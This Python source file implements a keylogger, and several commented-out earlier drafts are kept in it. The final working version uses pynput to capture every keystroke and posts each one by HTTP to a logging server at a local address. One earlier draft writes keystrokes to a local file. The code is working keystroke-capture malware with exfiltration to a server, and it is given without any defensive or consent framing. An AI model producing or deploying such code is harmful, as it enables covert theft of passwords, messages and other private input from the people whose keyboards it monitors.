# from pynput import keyboard

# def keypressed(key):
#     print(str(key))
#     with open("keyfile.txt", 'a') as logkey:
#         try:
#             char = key.char
#             logkey.write(char)
#         except :
#             print("Error getting char")

# if __name__ == "__main__":
#     listener = keyboard.Listener(on_press=keypressed)
#     listener.start()
#     input()


            # keylogger and server connection 

# import requests
# from pynput.keyboard import Listener ,Key

# # URL of the server to send the keystrokes
# SERVER_URL = "http://127.0.0.1:5000/log"

# # Function to send the keystrokes to the server
# def send_to_server(data):
#     try:
#         requests.post(SERVER_URL, data={'keystrokes':data})
#     except Exception as e:
#         print("Error:", e)

# # Function to handle key press events
# def on_press(key):
#     try:
#         # Convert the pressed key to string and send it to the server
#         send_to_server(str(key))
#     except AttributeError:
#         # Ignore special keys like 'Key.space' or 'Key.ctrl_l'
#         pass

# # Start listening for key press events
# with Listener(on_press=on_press) as listener:
#     listener.join()


  
###############################################################


# import requests
# from pynput.keyboard import Listener, Key

# # URL of the server to send the keystrokes
# SERVER_URL = "http://127.0.0.1:5000/log"

# # Function to send the keystrokes to the server
# def send_to_server(data):
#     try:
#         requests.post(SERVER_URL, data={'keystrokes': data})
#     except Exception as e:
#         print("Error:", e)

# # Function to handle key press events
# def on_press(key):
#     try:
#         # Convert the pressed key to string and send it to the server
#         if hasattr(key, 'char'):
#             # Regular alphanumeric key
#             send_to_server(key.char)
#         else:
#             # Special key
#             send_to_server(str(key))
#     except AttributeError:
#         # Ignore special keys like 'Key.space' or 'Key.ctrl_l'
#         pass

# # Start listening for key press events
# with Listener(on_press=on_press) as listener:
#     listener.join()

import requests
from pynput.keyboard import Listener

# URL of the server to send the keystrokes
SERVER_URL = "http://127.0.0.1:5000/log"

# Function to send the keystrokes to the server
def send_to_server(data):
    try:
        requests.post(SERVER_URL, data={'keystrokes': data})
    except Exception as e:
        print("Error sending data to server:", e)

# Function to handle key press events
def on_press(key):
    try:
        # Convert the pressed key to string
        key_str = str(key)
        
        # Send key to server
        send_to_server(key_str)
    except Exception as e:
        print("Error handling key press:", e)

# Start listening for key press events
with Listener(on_press=on_press) as listener:
    listener.join()
